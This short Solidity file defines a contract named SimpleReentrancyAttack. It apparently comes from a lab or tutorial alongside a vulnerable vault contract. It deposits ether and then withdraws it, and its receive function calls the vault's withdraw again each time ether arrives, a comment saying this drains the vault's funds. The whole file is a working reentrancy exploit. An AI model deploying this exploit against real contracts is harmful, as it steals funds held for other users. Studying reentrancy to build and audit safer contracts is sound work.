// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SimpleReentrancy.sol";

contract SimpleReentrancyAttack{

    address vault;

    constructor(address _vault){
        vault = _vault;
    }

    function deposit() external payable {
        Vault(vault).deposit{value: msg.value}();
    }

    function withdraw() external payable {
        Vault(vault).withdraw();
    }

    receive() external payable {
        // receive function is automatically invoked when this smart contract recieves any ether
        // and then it will drain the funds by kind of looping over the vault contract
        try Vault(vault).withdraw() {} catch {}
    }
}